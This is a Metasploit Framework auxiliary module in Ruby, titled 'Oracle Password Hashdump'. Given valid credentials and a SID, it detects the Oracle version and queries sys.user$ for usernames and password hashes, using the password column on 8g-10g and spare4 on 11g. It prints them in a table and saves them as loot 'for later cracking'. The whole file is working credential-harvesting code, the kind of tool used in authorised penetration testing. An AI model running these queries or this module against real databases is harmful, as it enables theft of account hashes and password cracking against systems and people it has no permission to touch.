##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::ORACLE
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner


  def initialize(info={})
    super(
        update_info(
            info,
            'Name'           => 'Oracle Password Hashdump',
            'Description'    => %Q{
              This module dumps the usernames and password hashes
              from Oracle given the proper Credentials and SID.
              These are then stored as loot for later cracking.
            },
            'Author'         => ['theLightCosine'],
            'License'        => MSF_LICENSE
        )
    )
  end

  def run_host(ip)
    return if not check_dependencies

    #Checks for Version of Oracle, 8g-10g all behave one way, while 11g behaves differently
    #Also, 11g uses SHA-1 while 8g-10g use DES
    is_11g=false
    query =  'select * from v$version'
    ver = prepare_exec(query)

    if ver.nil?
      print_error("An Error has occured, check your OPTIONS")
      return
    end

    unless ver.empty?
      if ver[0].include?('11g')
        is_11g=true
        print_status("Server is running 11g, using newer methods...")
      end
    end

    this_service = report_service(
          :host  => datastore['RHOST'],
          :port => datastore['RPORT'],
          :name => 'oracle',
          :proto => 'tcp'
          )



    tbl = Rex::Ui::Text::Table.new(
      'Header'  => 'Oracle Server Hashes',
      'Indent'   => 1,
      'Columns' => ['Username', 'Hash']
    )

    #Get the usernames and hashes for 8g-10g
    begin
      if is_11g==false
        query='SELECT name, password FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
        results= prepare_exec(query)
        unless results.empty?
          results.each do |result|
            row= result.split(/,/)
            tbl << row
          end
        end
      #Get the usernames and hashes for 11g
      else
        query='SELECT name, spare4 FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
        results= prepare_exec(query)
        #print_status("Results: #{results.inspect}")
        unless results.empty?
          results.each do |result|
            row= result.split(/,/)
            row[2] = 'No'
            tbl << row
          end
        end

      end
    rescue => e
      print_error("An error occured. The supplied credentials may not have proper privs")
      return
    end
    print_status("Hash table :\n #{tbl}")
    report_hashes(tbl.to_csv, is_11g, ip, this_service)
  end



  def report_hashes(hash_loot, is_11g, ip, service)
    #reports the hashes slightly differently depending on the version
    #This is so that we know which are which when we go to crack them
    if is_11g==false
      filename= "#{ip}-#{datastore['RPORT']}_oraclehashes.txt"
      store_loot("oracle.hashes", "text/plain", ip, hash_loot, filename, "Oracle Hashes", service)
      print_status("Hash Table has been saved")
    else
      filename= "#{ip}-#{datastore['RPORT']}_oracle11ghashes.txt"
      store_loot("oracle11g.hashes", "text/plain", ip, hash_loot, filename, "Oracle 11g Hashes", service)
      print_status("Hash Table has been saved")
    end
  end




end
